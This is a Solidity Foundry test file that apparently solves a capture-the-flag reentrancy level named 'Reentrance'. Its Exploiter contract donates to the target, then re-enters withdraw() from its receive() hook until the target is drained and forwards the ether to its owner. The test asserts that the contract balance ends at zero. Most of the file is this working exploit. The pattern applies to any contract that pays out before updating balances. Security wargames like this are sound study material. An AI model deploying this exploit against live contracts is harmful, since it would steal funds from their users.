pragma solidity ^0.6.12;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "forge-std/console2.sol";

import "src/11.sol";

contract Exploiter {

    address owner;
    Reentrance _instance;

    constructor() public {
        owner = msg.sender;
    }

    function exploit(Reentrance instance) external {
        _instance = instance;
        _instance.withdraw(1 ether);
    }

    receive() external payable { 
        if(address(_instance).balance > 1) {
            _instance.withdraw(1 ether);
        }
        else {
            (bool success, ) = address(owner).call{value: address(this).balance}("");
            require(success, "Error Withdraw from exploit");
        }
    }
}

contract Test11 is Test {

    address user = address(0x1);
    Reentrance instance;
    
    function setUp() public {
        instance = new Reentrance{value: 10 ether}();

        vm.deal(user, 1 ether);
    }

    function testSolve() public {
        vm.startPrank(user);
        Exploiter exploiter = new Exploiter();
        
        instance.donate{value: 1 ether}(address(exploiter));

        vm.stopPrank();

        uint256 contractBalanceBefore = address(instance).balance;
        console.log("Contract Balance Before the exploit: ", contractBalanceBefore / 1e18);

        console.log("User Balance Before the exploit: ", user.balance / 1e18);

        exploiter.exploit(instance);

        console.log("");

        uint256 contractBalanceAfter = address(instance).balance;
        console.log("Contract Balance After the exploit: ", contractBalanceAfter / 1e18);

        console.log("User Balance After the exploit: ", user.balance / 1e18);



        assertEq(contractBalanceAfter, 0);
    }

}